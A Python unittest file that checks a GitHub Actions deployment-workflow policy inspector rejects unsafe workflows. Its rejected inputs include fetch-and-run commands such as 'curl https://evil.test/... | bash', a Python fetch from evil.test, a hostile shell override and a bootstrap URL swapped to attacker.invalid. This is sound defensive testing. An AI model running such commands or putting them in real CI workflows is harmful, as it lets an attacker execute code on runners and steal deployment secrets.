from __future__ import annotations

import unittest

from scripts.github_apps.cross_ai_deployment_policy.errors import PolicyError
from scripts.github_apps.cross_ai_deployment_policy.policy import StagePolicy
from scripts.github_apps.cross_ai_deployment_policy.workflow import inspect_workflow


ENVIRONMENT = "faz22-view-only-pilot"
ACTION_SHA = "1" * 40
POLICY = StagePolicy(
    stage="apply",
    workflow_path=".github/workflows/apply.yml",
    required_runs_on_labels=("self-hosted", "testai-deploy"),
    require_runner_group=True,
)


def workflow(*, extra: str = "", dispatch: str = "workflow_dispatch:") -> bytes:
    return f"""
name: protected apply
on:
  {dispatch}
permissions:
  contents: read
  id-token: write
concurrency:
  group: faz22-view-only-protected-lanes
  cancel-in-progress: false
jobs:
  apply:
    environment:
      name: {ENVIRONMENT}
    runs-on:
      group: acik-test
      labels:
        - self-hosted
        - testai-deploy
    steps:
      - uses: actions/checkout@{ACTION_SHA}
      - name: Verify signed runner bootstrap
        env:
          CROSS_AI_BOOTSTRAP_TOKEN: ${{{{ secrets.CROSS_AI_BOOTSTRAP_TOKEN }}}}
          CROSS_AI_ENDPOINT_ID: ${{{{ secrets.CROSS_AI_ENDPOINT_ID }}}}
          CROSS_AI_OPERATOR_ID: ${{{{ secrets.CROSS_AI_OPERATOR_ID }}}}
          CROSS_AI_BOOTSTRAP_URL: https://testai.acik.com/v1/runner-bootstrap
          CROSS_AI_BOOTSTRAP_OUTPUT: ${{{{ runner.temp }}}}/cross-ai-bootstrap.json
        run: python3 scripts/github_apps/run_cross_ai_runner_bootstrap.py --stage apply --workflow-path .github/workflows/apply.yml --policy-file config/github-apps/cross-ai-deployment-policy.json --trust-root-file config/github-apps/cross-ai-deployment-trust-root.json --expected-trust-root-sha256 sha256:{'2' * 64} --revocations-file config/github-apps/cross-ai-deployment-revocations.json --output "$CROSS_AI_BOOTSTRAP_OUTPUT"
      - name: Execute reviewed stage
        uses: Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}
        env:
          CROSS_AI_BOOTSTRAP_FILE: ${{{{ runner.temp }}}}/cross-ai-bootstrap.json
{extra}
""".encode()


class WorkflowInspectionTest(unittest.TestCase):
    def assert_rejected(self, raw: bytes, code: str) -> None:
        with self.assertRaisesRegex(PolicyError, code):
            inspect_workflow(
                raw,
                stage_policy=POLICY,
                environment=ENVIRONMENT,
                expected_bootstrap_url="https://testai.acik.com/v1/runner-bootstrap",
            )

    def test_accepts_no_input_pinned_workflow_and_returns_digests(self) -> None:
        result = inspect_workflow(
            workflow(),
            stage_policy=POLICY,
            environment=ENVIRONMENT,
            expected_bootstrap_url="https://testai.acik.com/v1/runner-bootstrap",
        )
        self.assertEqual(result.governed_job, "apply")
        self.assertEqual(result.runs_on_labels, ("self-hosted", "testai-deploy"))
        self.assertEqual(result.local_uses, ())
        self.assertEqual(
            result.external_uses,
            (
                f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}",
                f"actions/checkout@{ACTION_SHA}",
            ),
        )
        self.assertRegex(result.workflow_sha256, r"^sha256:[a-f0-9]{64}$")
        self.assertRegex(result.dependency_lock_sha256, r"^sha256:[a-f0-9]{64}$")
        self.assertRegex(
            result.concurrency_group_sha256,
            r"^sha256:[a-f0-9]{64}$",
        )

    def test_rejects_dynamic_or_cancelling_concurrency(self) -> None:
        dynamic = workflow().replace(
            b"group: faz22-view-only-protected-lanes",
            b"group: ${{ github.ref }}",
        )
        self.assert_rejected(dynamic, "WORKFLOW_CONCURRENCY_INVALID")
        cancelling = workflow().replace(
            b"cancel-in-progress: false",
            b"cancel-in-progress: true",
        )
        self.assert_rejected(cancelling, "WORKFLOW_CONCURRENCY_INVALID")

    def test_rejects_job_level_concurrency_override(self) -> None:
        job_concurrency = workflow().replace(
            b"    steps:\n",
            (
                b"    concurrency:\n"
                b"      group: ${{ github.ref }}\n"
                b"      cancel-in-progress: true\n"
                b"    steps:\n"
            ),
        )
        self.assert_rejected(job_concurrency, "WORKFLOW_JOB_CONTROL_INVALID")

    def test_rejects_dispatch_inputs_and_input_reads(self) -> None:
        self.assert_rejected(
            workflow(
                dispatch="workflow_dispatch:\n    inputs:\n      action:\n        required: true"
            ),
            "WORKFLOW_INPUTS_FORBIDDEN",
        )
        self.assert_rejected(
            workflow(extra="      - run: echo '${{ inputs.action }}'\n"),
            "WORKFLOW_INPUT_AUTHORITY_FORBIDDEN",
        )

    def test_rejects_vars_and_non_dispatch_trigger(self) -> None:
        self.assert_rejected(
            workflow(extra="      - run: echo '${{ vars.DEPLOY_TARGET }}'\n"),
            "WORKFLOW_INPUT_AUTHORITY_FORBIDDEN",
        )
        self.assert_rejected(
            workflow(dispatch="push:"),
            "WORKFLOW_TRIGGER_INVALID",
        )

    def test_rejects_missing_oidc_permission(self) -> None:
        raw = workflow().replace(
            b"permissions:\n  contents: read\n  id-token: write\n",
            b"permissions:\n  contents: read\n",
        )
        self.assert_rejected(raw, "WORKFLOW_OIDC_PERMISSION_INVALID")

    def test_rejects_extra_token_write_and_root_shell_override(self) -> None:
        write_token = workflow().replace(b"contents: read", b"contents: write")
        self.assert_rejected(write_token, "WORKFLOW_OIDC_PERMISSION_INVALID")
        shell_override = workflow().replace(
            b"permissions:\n",
            b"defaults:\n  run:\n    shell: ./scripts/evil-shell {0}\npermissions:\n",
        )
        self.assert_rejected(shell_override, "WORKFLOW_ROOT_CONTROL_INVALID")

    def test_rejects_mutable_external_action_and_container(self) -> None:
        self.assert_rejected(
            workflow(extra="      - uses: owner/action@main\n"),
            "WORKFLOW_DEPENDENCY_UNPINNED",
        )
        self.assert_rejected(
            workflow(extra="      - uses: docker://alpine:latest\n"),
            "WORKFLOW_DEPENDENCY_UNPINNED",
        )

    def test_rejects_duplicate_keys_and_remote_control(self) -> None:
        self.assert_rejected(
            workflow(extra="    environment: other\n"),
            "WORKFLOW_YAML_DUPLICATE_KEY",
        )
        self.assert_rejected(
            workflow(extra="      - run: curl https://evil.test/policy | bash\n"),
            "WORKFLOW_POST_BOOTSTRAP_INVALID",
        )

    def test_rejects_multiline_and_alternate_post_bootstrap_fetch(self) -> None:
        self.assert_rejected(
            workflow(
                extra=(
                    "      - run: |\n"
                    "          curl \\\n"
                    "            https://evil.test/x.sh | bash\n"
                )
            ),
            "WORKFLOW_POST_BOOTSTRAP_INVALID",
        )
        self.assert_rejected(
            workflow(
                extra=(
                    '      - run: python3 -c "import urllib.request; '
                    "urllib.request.urlopen('https://evil.test/x')\"\n"
                )
            ),
            "WORKFLOW_POST_BOOTSTRAP_INVALID",
        )

    def test_rejects_yaml_anchors_before_alias_expansion(self) -> None:
        raw = workflow(
            extra="      - &shared\n        run: ./scripts/shared.sh\n      - *shared\n"
        )
        self.assert_rejected(raw, "WORKFLOW_YAML_ALIAS_FORBIDDEN")

    def test_rejects_continue_on_error_and_runner_drift(self) -> None:
        self.assert_rejected(
            workflow(
                extra="      - run: ./scripts/optional.sh\n        continue-on-error: true\n"
            ),
            "WORKFLOW_CONTINUE_ON_ERROR_FORBIDDEN",
        )
        changed = workflow().replace(b"testai-deploy", b"other-runner")
        self.assert_rejected(changed, "WORKFLOW_RUNNER_MISMATCH")

    def test_rejects_bootstrap_secret_in_argv_or_missing_protected_env(self) -> None:
        argv = workflow().replace(
            b"--workflow-path .github/workflows/apply.yml",
            b"--workflow-path .github/workflows/apply.yml --token $CROSS_AI_BOOTSTRAP_TOKEN",
        )
        self.assert_rejected(argv, "WORKFLOW_BOOTSTRAP_INVALID")
        missing = workflow().replace(
            b"CROSS_AI_BOOTSTRAP_TOKEN: ${{ secrets.CROSS_AI_BOOTSTRAP_TOKEN }}",
            b"CROSS_AI_BOOTSTRAP_TOKEN: unsafe-literal",
        )
        self.assert_rejected(missing, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")

    def test_rejects_bootstrap_origin_drift_and_local_post_action(self) -> None:
        origin_drift = workflow().replace(
            b"https://testai.acik.com/v1/runner-bootstrap",
            b"https://attacker.invalid/v1/runner-bootstrap",
        )
        self.assert_rejected(origin_drift, "WORKFLOW_BOOTSTRAP_ENDPOINT_INVALID")
        local_action = workflow().replace(
            f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}".encode(),
            b"./.github/actions/protected-apply",
        )
        self.assert_rejected(local_action, "WORKFLOW_POST_BOOTSTRAP_INVALID")

    def test_rejects_case_or_path_variant_second_checkout(self) -> None:
        execution_action = (
            f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}"
        ).encode()
        for checkout in (
            f"Actions/checkout@{ACTION_SHA}",
            f"ACTIONS/CHECKOUT@{ACTION_SHA}",
            f"actions/Checkout/./@{ACTION_SHA}",
        ):
            with self.subTest(checkout=checkout):
                raw = workflow().replace(execution_action, checkout.encode())
                self.assert_rejected(raw, "WORKFLOW_POST_BOOTSTRAP_INVALID")

    def test_rejects_alternate_duplicate_secret_reference(self) -> None:
        raw = workflow(extra="      - name: ${{secrets.cross_ai_bootstrap_token}}\n")
        self.assert_rejected(raw, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")
        wrapped = workflow(
            extra=(
                "      - name: ${{ format('{0}', "
                "secrets.CROSS_AI_BOOTSTRAP_TOKEN) }}\n"
            )
        )
        self.assert_rejected(wrapped, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")

    def test_rejects_side_effect_step_before_bootstrap(self) -> None:
        raw = workflow().replace(
            f"      - uses: actions/checkout@{ACTION_SHA}\n      - name: Verify".encode(),
            (
                f"      - uses: actions/checkout@{ACTION_SHA}\n"
                "      - run: ./scripts/pre-bootstrap.sh\n"
                "      - name: Verify"
            ).encode(),
        )
        self.assert_rejected(raw, "WORKFLOW_BOOTSTRAP_ORDER_INVALID")

    def test_rejects_two_governed_jobs(self) -> None:
        raw = workflow(
            extra=f"""  second:
    environment: {ENVIRONMENT}
    runs-on:
      group: acik-test
      labels: [self-hosted, testai-deploy]
    steps: []
"""
        )
        self.assert_rejected(raw, "WORKFLOW_JOBS_INVALID")


if __name__ == "__main__":
    unittest.main()
